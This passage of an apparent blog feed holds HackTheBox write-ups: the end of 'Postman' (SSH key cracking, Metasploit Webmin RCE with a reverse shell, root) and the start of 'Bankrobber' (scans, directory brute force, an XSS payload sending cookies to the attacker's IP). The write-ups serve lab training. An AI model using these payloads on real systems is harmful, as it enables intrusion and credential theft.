OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.4*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002</span><br><span class="line">debug1: Authenticating to 10.10.10.160:22 as <span class="string">'redis'</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br><span class="line">debug1: kex: algorithm: curve25519-sha256</span><br><span class="line">debug1: kex: host key algorithm: ecdsa-sha2-nistp256</span><br><span class="line">debug1: kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line">debug1: Server host key: ecdsa-sha2-nistp256 SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0</span><br><span class="line">debug1: Host <span class="string">'10.10.10.160'</span> is known and matches the ECDSA host key.</span><br><span class="line">debug1: Found key <span class="keyword">in</span> /root/.ssh/known_hosts:3</span><br><span class="line">debug1: rekey out after 134217728 blocks</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS sent</span><br><span class="line">debug1: expecting SSH2_MSG_NEWKEYS</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS received</span><br><span class="line">debug1: rekey <span class="keyword">in</span> after 134217728 blocks</span><br><span class="line">debug1: Will attempt key: id_rsa RSA SHA256:RHbmsaWNCcKp3yQZ5DzJzY7qtBWYIMl5z5h3BT1dbP8 explicit</span><br><span class="line">debug1: SSH2_MSG_EXT_INFO received</span><br><span class="line">debug1: kex_input_ext_info: server-sig-algs=&lt;ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521&gt;</span><br><span class="line">debug1: SSH2_MSG_SERVICE_ACCEPT received</span><br><span class="line">debug1: Authentications that can <span class="built_in">continue</span>: publickey,password</span><br><span class="line">debug1: Next authentication method: publickey</span><br><span class="line">debug1: Offering public key: id_rsa RSA SHA256:RHbmsaWNCcKp3yQZ5DzJzY7qtBWYIMl5z5h3BT1dbP8 explicit</span><br><span class="line">debug1: Server accepts key: id_rsa RSA SHA256:RHbmsaWNCcKp3yQZ5DzJzY7qtBWYIMl5z5h3BT1dbP8 explicit</span><br><span class="line">debug1: Authentication succeeded (publickey).</span><br><span class="line">Authenticated to 10.10.10.160 ([10.10.10.160]:22).</span><br><span class="line">debug1: channel 0: new [client-session]</span><br><span class="line">debug1: Requesting no-more-sessions@openssh.com</span><br><span class="line">debug1: Entering interactive session.</span><br><span class="line">debug1: pledge: network</span><br><span class="line">debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0</span><br><span class="line">debug1: Sending environment.</span><br><span class="line">debug1: Sending env LANG = en_US.utf8</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Sun Mar 15 00:54:05 2020 from 10.10.15.124</span><br><span class="line">redis@Postman:~$ whoami</span><br><span class="line">redis</span><br></pre></td></tr></table></figure><p>It works! I‚Äôve got now the initial shell.</p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>By doing some <code>Recon</code> i‚Äôll use <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" target="_blank" rel="noopener">LinEnum.sh</a> ‚Äì Scripted Local Linux Enumeration &amp; Privilege Escalation Checks.<br>It will help to find weaknesses and save my time to do the Privilege Escalation,  I‚Äôll uploaded it into <code>/tmp/</code> directories of redis and execute it, so:</p><p><img src="/img/postman/postman-linenum.png" alt="HackTheBox-Postman/postman-linenum.png" title="Recon LinEnum"></p><p>At first it will show the system information of Postman machine.</p><h3 id="Shell-user"><a href="#Shell-user" class="headerlink" title="Shell user"></a>Shell user</h3><p>I see the user <code>Matt</code> and also my shell user as Redis.</p><p><img src="/img/postman/postman-users.png" alt="HackTheBox-Postman/postman-users.png" title="Recon LinEnum"></p><h3 id="Backup-private-SSH-Key"><a href="#Backup-private-SSH-Key" class="headerlink" title="Backup private SSH Key"></a>Backup private SSH Key</h3><p>Going deep of recon, there‚Äôs a file that caught my attention. Is a backup SSH key of some user. Base on the info that show‚Äô it is owned by user <code>Matt</code></p><p><img src="/img/postman/postman-private-keys.png" alt="HackTheBox-Postman/postman-private-keys.png" title="Recon LinEnum"></p><p>Going to the <code>/opt/</code> directory, I‚Äôll try to transfer <code>id_rsa.bak</code> into my machine but it seems not working, so I used <code>cat</code> to view the content of the file.</p><p><img src="/img/postman/postman-cat-keys.png" alt="HackTheBox-Postman/postman-cat-keys.png" title="Matt SSH Key"></p><h3 id="Cracking-the-HASH"><a href="#Cracking-the-HASH" class="headerlink" title="Cracking the HASH"></a>Cracking the HASH</h3><p>I copy the content of <code>id_rsa.bak</code> into my machine and I use <a href="https://github.com/koboi137/john/blob/bionic/ssh2john.py" target="_blank" rel="noopener">ssh2john</a> to convert and crack it with <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">John The Ripper</a></p><p><img src="/img/postman/postman-crack.png" alt="HackTheBox-Postman/postman-crack.png" title="Crack SSH Key"></p><p>Cracking this using <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">John The Ripper</a>.</p><p><img src="/img/postman/postman-crack-john.png" alt="HackTheBox-Postman/postman-crack-john.png" title="Crack SSH Key"></p><p>Just only 14 seconds. I‚Äôve got now the password of <code>Matt</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">password:   computer2008</span><br></pre></td></tr></table></figure><h3 id="Login-as-Matt"><a href="#Login-as-Matt" class="headerlink" title="Login as Matt"></a>Login as Matt</h3><p>I may now able to login as <code>Matt</code> and get the <code>user.txt</code></p><p><img src="/img/postman/postman-user.png" alt="HackTheBox-Postman/postman-user.png" title="Matt user shell"></p><h3 id="CVE-Webmin-1-910"><a href="#CVE-Webmin-1-910" class="headerlink" title="CVE Webmin 1.910"></a>CVE Webmin 1.910</h3><p>In the early stage of my Penetration Testing to this machine‚Äô there‚Äôs an existing vulnerability ‚Äì <code>CVE Webmin 1.910</code> that need credentials. I‚Äôll use metasploit to do the exploitation and pick the <code>webmin_packageup_rce</code></p><p><img src="/img/postman/postman-msf.png" alt="HackTheBox-Postman/postman-msf.png" title="Webmin 1.910 Exploit"></p><p>I will use the credentails for Matt and let‚Äôs see what will happen ;)</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># metasploit</span></span><br><span class="line"></span><br><span class="line">msf5 &gt; exploit(linux/http/webmin_packageup_rce) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME                    yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br></pre></td></tr></table></figure><p>base on the options it requires ‚Äì <code>PASSWORD</code>, <code>RPORT is on default 10000</code>, <code>RHOSTS which is the victim IP (Postman)</code>, <code>SSL (will set to true)</code>, and <code>USERNAME</code> so:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># metasploit</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> PASSWORD computer2008</span><br><span class="line">PASSWORD =&gt; computer2008</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> RHOSTS 10.10.10.160</span><br><span class="line">RHOSTS =&gt; 10.10.10.160</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> SSL <span class="literal">true</span></span><br><span class="line">SSL =&gt; <span class="literal">true</span></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> USERNAME Matt</span><br><span class="line">USERNAME =&gt; Matt</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> LHOST 10.10.10.160</span><br><span class="line">LHOST =&gt; 10.10.10.160</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.15.124:4444 </span><br><span class="line">[+] Session cookie: 6fda9f4ceb95660a3799aaf46bffea37</span><br><span class="line">[*] Attempting to execute the payload...</span><br><span class="line">[*] Command shell session 1 opened (10.10.15.124:4444 -&gt; 10.10.10.160:47708) at 2020-03-15 09:33:49 +0800</span><br><span class="line"></span><br><span class="line">[*] Trying to find binary(python) on target machine</span><br><span class="line">[*] Found python at /usr/bin/python</span><br><span class="line">[*] Using `python` to pop up an interactive shell</span><br></pre></td></tr></table></figure><p>It works! And to upgrade my shell i use <code>import pty</code> using <code>python</code>:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash");'</span></span><br></pre></td></tr></table></figure><hr><h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Very straightforward ‚Äì Rooted! Now i can get the <code>root.txt</code> </p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root@Postman:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p><img src="/img/postman/postman-rooted.png" alt="HackTheBox-Postman/postman-rooted.png" title="Postman - Rooted!"></p><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:</p><p><a href="https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0" target="_blank" rel="noopener">Exploit Redis Server Article</a></p><p><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis" target="_blank" rel="noopener">Pentesting with Redis</a></p><p><a href="https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce" target="_blank" rel="noopener">Official Exploit of Webmin 1.910</a></p><p><a href="https://ebook.konfigurasi.net/Security/Kali_Linux_An_Ethical_Hacker' target="_blank" rel="noopener"s_Cookbook.pdf">How to get in into the machine with Redis Exploitation</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> retired </tag>
            
            <tag> ctf </tag>
            
            <tag> cve </tag>
            
            <tag> pentest </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Bankrobber</title>
      <link href="/2020-02-20/HackTheBox-Bankrobber/"/>
      <url>/2020-02-20/HackTheBox-Bankrobber/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/bank/bank-detail1.png" alt="HackTheBox-Bankrobber/bank-detail.png" title="Bankrobber machine details"></p><p>Quick Summary</p><p>   ‚Üí Insane machine ‚Äì Bankrobber is a Web Application that vulnerable to <code>XSS</code>, <code>SQL Injection</code> and <code>RCE</code> that I have to exploit to get the Admin credentials by using XSS.<br>   SQL Injection to study how‚Äôs the <code>backdoorchecker.php</code> work, do command injection inside the machine from Web Application to get a reverse shell.<br>   Inside the machine‚Äô I did portforwarding to test the E-Coin transfer‚Äô from there I managed to inject RCE and get the root.</p><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>‚Üí Nmap scan</p><p>‚Üí discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>‚Üí Browsing the HTTP Service</p><p>‚Üí MySQL and SMB open</p><p>‚Üí Bruteforce the Web page directories</p></li><li><p><strong>Post - Exploitation</strong></p><p>‚Üí Create account and Login</p><p>‚Üí Transfer any amount of e-coin</p><p>‚Üí Do client side attack</p><p>‚Üí Use XSS to steal admin credentials</p><p>‚Üí Login as admin and find some interesting in the page</p></li><li><p><strong>Exploitation</strong></p><p>‚Üí Found an XSS and SQL Injection vulnerabilites in <code>search.php</code> and <code>backdoorchecker.php</code></p><p>‚Üí Upload a webshell to the server and get a reverse shell</p></li><li><p><strong>Privilege Escalation</strong></p><p>‚Üí Use <a href="https://github.com/carlospolop/winpe" target="_blank" rel="noopener">winPE</a>. or <code>Windows privilege escalation with cmd</code></p><p>‚Üí Looking at running process and active connections inside the machine</p><p>‚Üí Use obfuscated meterpreter and tunnel the network with Portforwarding</p><p>‚Üí Bruteforce the digit code and test the E-coin transfer</p><p>‚Üí Found <code>RCE</code>(Remote Code Execution) in E-coin transfer</p><p>‚Üí Gain the Administrator shell</p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí First, I run the <strong>Nmap</strong> to scan the target and get information about the various services that are running on the target machine. I use</p><hr><ul><li>-sV ‚áí Probe open ports to determine service/version info</li><li>-sC ‚áí equivalent to ‚Äîscript=default</li><li>-p- ‚áí Scan all 65535 ports</li><li>-oN ‚áí to save our scan results to a text file</li></ul><hr><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line">nmap -sV -sC -p- 10.10.10.154 -oN nmap-Bankrobber</span><br></pre></td></tr></table></figure><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>Which found opened ports 80, 443, 445 and 3306</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber </span><br><span class="line">‚ùØ nmap -sV -sC -p- nmap-bankrobber -oN 10.10.10.154</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 03:12 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.154</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">80/tcp   open  tcpwrapped</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4</span><br><span class="line">|_http-title: E-coin</span><br><span class="line">443/tcp  open  tcpwrapped</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4</span><br><span class="line">|_http-title: Bad request!</span><br><span class="line">| ssl-cert: Subject: commonName=localhost</span><br><span class="line">| Not valid before: 2009-11-10T23:48:47</span><br><span class="line">|_Not valid after:  2019-11-08T23:48:47</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">445/tcp  open  tcpwrapped</span><br><span class="line">3306/tcp open  tcpwrapped</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|phone</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2008|10|Phone (90%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 10 1511 - 1607 (85%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h02m13s, deviation: 0s, median: 1h02m13s</span><br><span class="line">|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-03-07T20:15:16</span><br><span class="line">|_  start_date: 2020-03-07T10:51:24</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 78.81 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber took 1m19s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>I visited the web page in port 80 and it‚Äôs present a Bitcoin web page with Login and Register form.</p><p><img src="/img/bank/web-page.gif" alt="HackTheBox-Bankrobber/web-page.gif" title="Bankrobber Web Page"></p><h3 id="MySQL-on-port-3306"><a href="#MySQL-on-port-3306" class="headerlink" title="MySQL on port 3306"></a>MySQL on port 3306</h3><p>The MySQL port is open so I try to connect with it but it couldn‚Äôt</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber </span><br><span class="line">‚ùØ mysql -h 10.10.10.154 --port 3306</span><br><span class="line">ERROR 1130 (HY000): Host <span class="string">'10.10.15.71'</span> is not allowed to connect to this MariaDB server</span><br></pre></td></tr></table></figure><h3 id="SMB-on-port-445"><a href="#SMB-on-port-445" class="headerlink" title="SMB on port 445"></a>SMB on port 445</h3><p>connecting to SMB is not helpful too.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber took 2s </span><br><span class="line">‚ùØ smbmap -H 10.10.10.154 -u bank</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[!] Authentication error on 10.10.10.154</span><br><span class="line">[!] Authentication error on 10.10.10.154</span><br></pre></td></tr></table></figure><h3 id="Brutefore-Web-directories"><a href="#Brutefore-Web-directories" class="headerlink" title="Brutefore Web directories"></a>Brutefore Web directories</h3><p>I also run <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> <code>Web path scanner</code> to look if there‚Äôs any interesting web directories.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> dirsearch on ÓÇ† master via üêç v2.7.17 </span><br><span class="line">‚ùØ ./dirsearch.py -u <span class="string">"http://10.10.10.154"</span> -e asd -t 50</span><br><span class="line"></span><br><span class="line"> _|. _ _  _  _  _ _|_    v0.3.9</span><br><span class="line">(_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: asd | HTTP method: get | Threads: 50 | Wordlist size: 6109</span><br><span class="line"></span><br><span class="line">Error Log: /opt/dirsearch/logs/errors-20-03-06_18-13-45.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.154</span><br><span class="line"></span><br><span class="line">[18:13:46] Starting: </span><br><span class="line">[18:13:47] 403 -    1KB - /%3f/        </span><br><span class="line">[18:13:47] 403 -    1KB - /%20../</span><br><span class="line">[18:13:47] 403 -    1KB - /%ff/             </span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccessOLD                             </span><br><span class="line">[18:13:49] 403 -    1KB - /.ht_wsr.txt     </span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess-marco</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess-local</span><br><span class="line">[18:13:49] 403 -    1KB - /.hta</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess-dev</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.sample</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.BAK</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess_orig</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.bak1</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.txt</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess_sc</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.old</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess_extra</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.orig</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.save</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccessOLD2</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess~</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccessBAK</span><br><span class="line">[18:13:49] 403 -    1KB - /.htgroup</span><br><span class="line">[18:13:49] 403 -    1KB - /.htpasswd-old</span><br><span class="line">[18:13:49] 403 -    1KB - /.htpasswd_test</span><br><span class="line">[18:13:49] 403 -    1KB - /.htpasswds</span><br><span class="line">[18:13:49] 403 -    1KB - /.htusers</span><br><span class="line">[18:13:54] 301 -  336B  - /Admin  -&gt;  http://10.10.10.154/Admin/                 </span><br><span class="line">[18:13:54] 301 -  336B  - /admin  -&gt;  http://10.10.10.154/admin/</span><br><span class="line">[18:13:54] 200 -   40B  - /admin%20/          </span><br><span class="line">[18:13:54] 301 -  336B  - /ADMIN  -&gt;  http://10.10.10.154/ADMIN/</span><br><span class="line">[18:13:54] 301 -  337B  - /admin.  -&gt;  http://10.10.10.154/admin./</span><br><span class="line">[18:13:55] 403 -    1KB - /admin/.htaccess   </span><br><span class="line">[18:13:55] 200 -   40B  - /admin/?/login</span><br><span class="line">[18:13:55] 200 -   40B  - /admin/                </span><br><span class="line">[18:13:55] 200 -   40B  - /admin/index.php                                                                  </span><br><span class="line">[18:14:05] 403 -    1KB - /cgi-bin/                                                                               </span><br><span class="line">[18:14:10] 301 -  334B  - /css  -&gt;  http://10.10.10.154/css/                   </span><br><span class="line">[18:14:15] 403 -    1KB - /error/                                         </span><br><span class="line">[18:14:17] 503 -    1KB - /examples/servlets/index.html                                               </span><br><span class="line">[18:14:17] 503 -    1KB - /examples/servlets/servlet/RequestHeaderExample</span><br><span class="line">[18:14:17] 503 -    1KB - /examples/servlets/servlet/CookieExample</span><br><span class="line">[18:14:17] 503 -    1KB - /examples </span><br><span class="line">[18:14:17] 503 -    1KB - /examples/</span><br><span class="line">[18:14:17] 301 -  336B  - /fonts  -&gt;  http://10.10.10.154/fonts/</span><br><span class="line">[18:14:21] 301 -  334B  - /img  -&gt;  http://10.10.10.154/img/                        </span><br><span class="line">[18:14:22] 200 -    8KB - /index.PHP                                                         </span><br><span class="line">[18:14:22] 200 -    8KB - /INDEX.PHP                                                                           </span><br><span class="line">[18:14:22] 200 -    8KB - /index.php</span><br><span class="line">[18:14:22] 200 -    8KB - /index.php/login/</span><br><span class="line">[18:14:24] 301 -  333B  - /js  -&gt;  http://10.10.10.154/js/                                              </span><br><span class="line">[18:14:26] 302 -    0B  - /login.php  -&gt;  index.php                                     </span><br><span class="line">[18:14:32] 403 -    1KB - /phpmyadmin                                                   </span><br><span class="line">[18:14:34] 403 -    1KB - /phpmyadmin/                                  </span><br><span class="line">[18:14:34] 403 -    1KB - /phpmyadmin/scripts/setup.php</span><br><span class="line">[18:14:36] 200 -    0B  - /register.php                                                        </span><br><span class="line">[18:14:37] 403 -    1KB - /server-info                                                                  </span><br><span class="line">[18:14:37] 403 -    1KB - /server-status</span><br><span class="line">[18:14:37] 403 -    1KB - /server-status/ </span><br><span class="line">[18:14:45] 403 -    1KB - Trace.axd::<span class="variable">$DATA</span>                                                                        </span><br><span class="line">[18:14:45] 301 -  335B  - /user  -&gt;  http://10.10.10.154/user/              </span><br><span class="line">[18:14:45] 200 -   39B  - /user/         </span><br><span class="line">[18:14:46] 403 -    1KB - web.config::<span class="variable">$DATA</span>                          </span><br><span class="line">                                                                                        </span><br><span class="line">Task Completed                                                                                                                                                                                                                    </span><br><span class="line">root <span class="keyword">in</span> dirsearch on ÓÇ† master via üêç v2.7.17 took 1m3s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>things that caught my attention is this web directories</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">[18:13:55] 200 -   40B  - /admin/?/login</span><br><span class="line">[18:13:55] 200 -   40B  - /admin/                </span><br><span class="line">[18:13:55] 200 -   40B  - /admin/index.php</span><br></pre></td></tr></table></figure><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Create-account-and-Login"><a href="#Create-account-and-Login" class="headerlink" title="Create account and Login"></a>Create account and Login</h3><p>To test‚Äô I created an account and login it too. Next,<br>I visited the <code>/admin/index.php</code> and says <code>You&#39;re not authorized to view this page</code> for me this is really weird, if you have experience in Web development you will notice that there was an misconfigured in this website.</p><p><img src="/img/bank/admin.PNG" alt="HackTheBox-Bankrobber/admin.png" title="Admin/index.php"></p><h3 id="Steal-Admin-creds-via-Cookies"><a href="#Steal-Admin-creds-via-Cookies" class="headerlink" title="Steal Admin creds via Cookies"></a>Steal Admin creds via Cookies</h3><p>Now I need to get the credentials of the admin. I try to look on the page source of the web page to look for hint but I did not see anything.<br>then I try the e-coin transfer in user page and this <code>alert</code> caught my attention.</p><p><img src="/img/bank/transfer.png" alt="HackTheBox-Bankrobber/transfer.png" title="Transfer e-coin"></p><p>It looks like the admin is checking each transfer transaction, so I intercept it with <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> (A Web Penetration Testing tool)</p><p><img src="/img/bank/bank-burp1.png" alt="HackTheBox-Bankrobber/bank-burp1.png" title="Bank burp1"></p><p>Using this payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" rel="noopener">PayloadAllTheThings</a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># xss</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">this.src</span>=<span class="string">"http://10.10.15.71/?c="</span>%<span class="attr">2bdocument.cookie</span>&gt;</span></span><br></pre></td></tr></table></figure><p>my user id # here is <code>ID #4</code>, my <code>username</code> and <code>password</code> in on <code>base64</code> code format.<br><code>toId=</code> is the id where I transfer my e-coin. I set first my <code>nc</code> listener on port 80 then I modify the response with my payload and send it.</p><p><img src="/img/bank/bank-burp-send.png" alt="HackTheBox-Bankrobber/bank-burp-send.png" title="Bank burp2"></p><p>after 5-10 minutes of waiting, I‚Äôll get a response in my <code>nc</code> listener and it‚Äôs the username and password of the admin in <code>base64</code> code format.<br>Convert it to plaintext and I got now the admin creds.</p><p><img src="/img/bank/bank-admin-creds.png" alt="HackTheBox-Bankrobber/bank-admin-creds.png" title="Bank Admin credentials"></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">username:   admin</span><br><span class="line">password:   Hopelessromantic</span><br></pre></td></tr></table></figure><h3 id="Login-as-Admin"><a href="#Login-as-Admin" class="headerlink" title="Login as Admin"></a>Login as 